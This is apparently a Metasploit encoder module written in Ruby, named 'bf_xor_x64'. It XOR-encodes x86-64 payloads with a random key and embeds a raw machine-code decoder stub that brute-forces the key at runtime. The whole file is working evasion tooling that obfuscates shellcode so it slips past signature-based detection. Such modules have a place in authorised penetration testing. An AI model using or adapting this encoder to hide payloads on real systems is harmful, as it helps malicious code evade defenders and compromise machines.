##
# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class Metasploit4 < Msf::Encoder

  def initialize
    super(
      'Name'             => 'bf_xor_x64',
      'Description'      => '',
      'Author'           => 'Pierre Present',
      'Arch'             => ARCH_X86_64,
      'License'          => MSF_LICENSE
      )
  end


  def decoder_stub(state)
    stub = ""
	stub << "\xEB\x57\x55\x48\x89\xE5\x48\x83\xEC\x30\x48\x8B\x7D\x20\x48\x8B\x75\x18\x48\x31\xC0\x48\x89\x45\xF8\x48\x89\xC1\x48\x83\xE1\x03\x48\x01\xC9\x48\x01\xC9\x48\x01\xC9\x48\x89\xD3\x48\xD3\xFB\x88\xD9\x48\x31\xDB\x48\x39\x5D\x28\x75\x21\x48\x0F\xB6\x1E\x48\x0F\xB6\xC9\x48\x31\xCB\x48\x8B\x4D\x10\x48\x0F\xB6\x0C\x08\x48\x39\xCB\x75\x0A\x48\xFF\x45\xF8\xEB\x04\xEB\x2B\x30\x0E\x48\xFF\xC0\x48\xFF\xC6\x48\x39\xF8\x7C\xB1\x48\x3B\x7D\xF8\x74\x13\x48\x83\x7D\x28\x01\x74\x07\xFF\xC2\x83\xFA\xFF\x72\x92\x48\x31\xC0\xEB\x03\x48\x89\xD0\xC9\xC3\x55\x48\x89\xE5\x48\x83\xEC\x20\xEB\x5C\x58\x48\x89\x45\xF8\xEB\x3E\x58\x48\x8B\x10\x48\x89\x55\xF0\x48\x83\xC0\x08\x48\x89\x45\xE8\x48\x31\xDB\x48\x31\xC0\x50\x6A\x0A\xFF\x75\xF8\xFF\x75\xE8\xE8\x47\xFF\xFF\xFF\x48\x85\xC0\x74\x13\x6A\x01\xFF\x75\xF0\xFF\x75\xF8\xFF\x75\xE8\xE8\x32\xFF\xFF\xFF\xFF\x65\xF8\xC9\xC3\xE8\xBD\xFF\xFF\xFF"

	stub << [state.buf.length].pack("Q")  # size payload
    stub << state.buf[0,10]
	
	stub << "\xE8\x9F\xFF\xFF\xFF"
    return stub
  end

  def encode_block(state, block)
    key = rand(2 ** 32)
    encoded = ""
    key_tab = [key].pack('Q<')
    i=0
    
    block.unpack('C*').each do |ch|
      octet = key_tab[i%4]
      t = ch.ord ^ octet.ord
      encoded += t.chr
      i+=1
    end
    return encoded
  end
end